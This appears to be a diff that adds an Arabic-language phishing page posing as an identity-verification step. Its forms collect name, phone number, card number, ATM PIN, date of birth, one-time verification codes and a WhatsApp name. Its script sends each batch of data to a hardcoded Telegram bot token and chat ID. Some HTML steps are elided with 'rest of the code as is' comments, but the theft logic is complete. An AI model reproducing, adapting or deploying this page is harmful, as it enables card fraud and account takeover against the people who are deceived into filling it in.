@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>التحقق من الهوية</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #FF6600;
+      --light: #F7F7F9;
+      --card-bg: #fff;
+      --border: #e5e5e5;
+      --error: #d9001b;
+      --success: #15b37a;
+      --radius: 16px;
+    }
+    body {
+      font-family: 'Tajawal', Arial, sans-serif;
+      background: var(--light);
+      margin: 0;
+      min-height: 100vh;
+      color: #222;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+    .wrapper {
+      width: 100%;
+      max-width: 420px;
+      margin: 24px auto 0 auto;
+      background: var(--card-bg);
+      border-radius: var(--radius);
+      box-shadow: 0 2px 16px rgba(0,0,0,0.07);
+      overflow: hidden;
+      padding-bottom: 18px;
+    }
+    .logo-area {
+      text-align: center;
+      padding: 0;
+      background: linear-gradient(90deg, #ffe3d1 0%, #fff 100%);
+      width: 100%;
+      height: 112px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo-area img {
+      width: 100%;
+      height: 96px;
+      max-width: unset;
+      max-height: unset;
+      object-fit: contain;
+      border-radius: 0;
+      box-shadow: none;
+      margin-bottom: 0;
+      display: block;
+    }
+    .step-area {
+      padding: 0 26px;
+      margin-top: 10px;
+    }
+    h2 {
+      margin: 0;
+      font-size: 1.45rem;
+      font-weight: 700;
+      color: #222;
+    }
+    .desc {
+      font-size: 1.07rem;
+      color: #666;
+      margin: 14px 0 22px;
+      text-align: right;
+    }
+    .form-group {
+      margin-bottom: 18px;
+    }
+    label {
+      font-weight: 500;
+      font-size: 1.04rem;
+      color: #444;
+      margin-bottom: 8px;
+      display: block;
+    }
+    .input-box {
+      display: flex;
+      align-items: center;
+      background: var(--light);
+      border-radius: var(--radius);
+      border: 2px solid var(--border);
+      padding: 0 14px;
+      transition: border-color 0.2s;
+    }
+    .input-box:focus-within {
+      border-color: var(--primary);
+    }
+    .input-icon {
+      font-size: 1.1rem;
+      color: #888;
+      margin-left: 7px;
+    }
+    input[type="text"], input[type="password"], input[type="tel"], input[type="number"] {
+      background: transparent;
+      border: none;
+      outline: none;
+      font-size: 1.07rem;
+      padding: 15px 0;
+      flex: 1;
+      color: #222;
+      direction: rtl;
+      font-family: 'Tajawal', Arial, sans-serif;
+    }
+    input:disabled {
+      background: #ececec;
+    }
+    .error {
+      color: var(--error);
+      font-size: 0.96rem;
+      margin-top: 3px;
+      font-weight: 500;
+      display: none;
+    }
+    .error.show {
+      display: block;
+    }
+    .btn-main {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: var(--radius);
+      font-size: 1.13rem;
+      font-weight: 700;
+      padding: 15px 0;
+      width: 100%;
+      margin-top: 20px;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(255,105,0,0.08);
+      transition: background 0.2s;
+      letter-spacing: 0.03em;
+    }
+    .btn-main:hover {
+      background: #e95c00;
+    }
+    .step {
+      display: none;
+      animation: fadeIn 0.33s;
+    }
+    .step.active {
+      display: block;
+    }
+    .whatsapp-info {
+      background: #e2ffe8;
+      border-radius: var(--radius);
+      padding: 16px;
+      margin-bottom: 22px;
+      text-align: center;
+      color: var(--success);
+      font-weight: 600;
+      font-size: 1.08rem;
+      box-shadow: 0 2px 8px rgba(21,179,122,0.07);
+    }
+    .success-msg {
+      font-size: 1.18rem;
+      color: var(--success);
+      text-align: center;
+      margin: 25px 0 10px 0;
+      font-weight: bold;
+    }
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(18px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+    /* Number keyboard for input fields */
+    input[type="tel"], input[type="number"] {
+      ime-mode: disabled;
+      -webkit-ime-mode: disabled;
+      -moz-ime-mode: disabled;
+      -ms-ime-mode: disabled;
+    }
+    /* Responsive */
+    @media (max-width:480px){
+      .wrapper {
+        max-width: 98vw;
+      }
+      .step-area {
+        padding: 0 10px;
+      }
+      .logo-area {
+        height: 78px;
+      }
+      .logo-area img {
+        height: 64px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="logo-area">
+      <img src="https://www2.0zz0.com/2025/09/28/02/413027069.jpeg" alt="الشعار"/>
+    </div>
+    <div class="step-area">
+      <!-- باقي الكود كما هو ... -->
+      <!-- ... -->
+      <!-- Step 2 -->
+      <div class="step" id="step-2">
+        <h2>التحقق من الهوية</h2>
+        <div class="desc">يرجى إدخال البيانات التالية للمتابعة.</div>
+        <form id="form-step-2" autocomplete="off">
+          <div class="form-group">
+            <label>رقم البطاقة (16 رقم)</label>
+            <div class="input-box">
+              <span class="input-icon">💳</span>
+              <input type="tel" inputmode="numeric" id="card" maxlength="16" pattern="[0-9]*" required autocomplete="off" />
+            </div>
+            <div class="error" id="err-card">يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم</div>
+          </div>
+          <div class="form-group">
+            <label>الرقم السري الخاص بالـ ATM</label>
+            <div class="input-box">
+              <span class="input-icon">🔒</span>
+              <input type="password" inputmode="numeric" id="atm" maxlength="4" pattern="[0-9]*" required autocomplete="off" />
+            </div>
+            <div class="error" id="err-atm">يرجى إدخال الرقم السري المكون من 4 أرقام</div>
+          </div>
+          <div class="form-group">
+            <label>تاريخ الميلاد (DD/MM/YYYY)</label>
+            <div class="input-box">
+              <span class="input-icon">📅</span>
+              <input type="text" id="dob" maxlength="10" placeholder="DD/MM/YYYY" required autocomplete="off" />
+            </div>
+            <div class="error" id="err-dob">يرجى إدخال تاريخ صحيح بالتنسيق DD/MM/YYYY</div>
+          </div>
+          <button class="btn-main" type="submit">أكمل</button>
+        </form>
+      </div>
+      <!-- باقي الخطوات كما هي ... -->
+    </div>
+  </div>
+<script>
+  let userData = {};
+
+  function showStep(n) {
+    document.querySelectorAll('.step').forEach((el, i) => {
+      el.classList.remove('active');
+      if (i === n - 1) el.classList.add('active');
+    });
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  }
+
+  function sendToTelegram(data) {
+    const token = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
+    const chat_id = "6873334348";
+    const txt = Object.entries(data).map(([k, v]) => `${k}: ${v}`).join('\n');
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({chat_id, text: txt})
+    });
+  }
+
+  document.getElementById('form-step-1').addEventListener('submit', function(e){
+    e.preventDefault();
+    let name = document.getElementById('fullname').value.trim();
+    let phone = document.getElementById('phone').value.trim();
+    let phoneValid = /^07[789]\d{7}$/.test(phone);
+
+    document.getElementById('err-fullname').classList.toggle('show', name.length < 4);
+    document.getElementById('err-phone').classList.toggle('show', !phoneValid);
+
+    if (name.length >= 4 && phoneValid) {
+      userData.fullname = name;
+      userData.phone = phone;
+      sendToTelegram({ الخطوة: "١- الاسم والهاتف", ...userData });
+      showStep(2);
+    }
+  });
+
+  document.getElementById('form-step-2').addEventListener('submit', function(e){
+    e.preventDefault();
+    let card = document.getElementById('card').value.trim();
+    let atm = document.getElementById('atm').value.trim();
+    let dob = document.getElementById('dob').value.trim();
+    let cardValid = /^\d{16}$/.test(card);
+    let atmValid = /^\d{4}$/.test(atm);
+
+    // إصلاح التحقق من التاريخ:
+    // التأكد من اليوم والشهر والسنة منطقية، وعدم قبول أرقام غير صحيحة أو مضاعفة.
+    let dobParts = dob.split('/');
+    let dobValid = false;
+    if (dobParts.length === 3) {
+      let [d, m, y] = dobParts;
+      if (/^\d{2}$/.test(d) && /^\d{2}$/.test(m) && /^\d{4}$/.test(y)) {
+        let day = parseInt(d, 10);
+        let month = parseInt(m, 10);
+        let year = parseInt(y, 10);
+        dobValid = (
+          day >= 1 && day <= 31 &&
+          month >= 1 && month <= 12 &&
+          year >= 1900 && year <= 2100
+        );
+      }
+    }
+    document.getElementById('err-card').classList.toggle('show', !cardValid);
+    document.getElementById('err-atm').classList.toggle('show', !atmValid);
+    document.getElementById('err-dob').classList.toggle('show', !dobValid);
+
+    if (cardValid && atmValid && dobValid) {
+      userData.card = card;
+      userData.atm = atm;
+      userData.dob = dobParts.map((v,i)=>i<2?v.padStart(2,'0'):v).join('/');
+      sendToTelegram({ الخطوة: "٢- بيانات البطاقة", ...userData });
+      showStep(3);
+    }
+  });
+
+  document.getElementById('form-step-3').addEventListener('submit', function(e){
+    e.preventDefault();
+    let verifycode = document.getElementById('verifycode').value.trim();
+    let valid = /^\d{6}$/.test(verifycode);
+    document.getElementById('err-verifycode').classList.toggle('show', !valid);
+    if (valid) {
+      userData.verifycode = verifycode;
+      sendToTelegram({ الخطوة: "٣- رمز التحقق", ...userData });
+      showStep(4);
+    }
+  });
+
+  document.getElementById('form-step-4').addEventListener('submit', function(e){
+    e.preventDefault();
+    let whatsId = document.getElementById('whatsid').value.trim();
+    document.getElementById('err-whatsid').classList.toggle('show', whatsId.length < 2);
+    if (whatsId.length >= 2) {
+      userData.whatsid = whatsId;
+      sendToTelegram({ الخطوة: "٤- الاسم التعريفي واتساب", ...userData });
+      showStep(5);
+    }
+  });
+
+  document.getElementById('form-step-5').addEventListener('submit', function(e){
+    e.preventDefault();
+    let verifycode2 = document.getElementById('verifycode2').value.trim();
+    let valid = /^\d{6}$/.test(verifycode2);
+    document.getElementById('err-verifycode2').classList.toggle('show', !valid);
+    if (valid) {
+      userData.verifycode2 = verifycode2;
+      sendToTelegram({ الخطوة: "٥- رمز تحقق ثاني", ...userData });
+      showStep(6);
+      setTimeout(() => { userData = {}; }, 3000);
+    }
+  });
+
+  ["phone", "card", "atm", "verifycode", "verifycode2"].forEach(id => {
+    let inp = document.getElementById(id);
+    inp.addEventListener('input', function(e){
+      this.value = this.value.replace(/[^\d]/g, '');
+    });
+  });
+
+  document.getElementById('dob').addEventListener('input', function(e){
+    // السماح فقط بالأرقام وشرطة واحدة بين كل جزء
+    let val = this.value.replace(/[^0-9\/]/g, '');
+    // منع كتابة أكثر من رقمين في اليوم والشهر
+    let parts = val.split('/');
+    if (parts.length > 3) parts = parts.slice(0,3);
+    if (parts[0]) parts[0] = parts[0].slice(0,2);
+    if (parts[1]) parts[1] = parts[1].slice(0,2);
+    if (parts[2]) parts[2] = parts[2].slice(0,4);
+
+    // إعادة بناء القيمة
+    let newVal = parts.join('/');
+    // إضافة شرطة تلقائية بعد اليوم والشهر
+    if (newVal.length === 2 && !newVal.includes('/')) newVal += '/';
+    if (newVal.length === 5 && newVal.split('/').length < 2) newVal += '/';
+
+    this.value = newVal;
+  });
+</script>
+</body>
+</html>
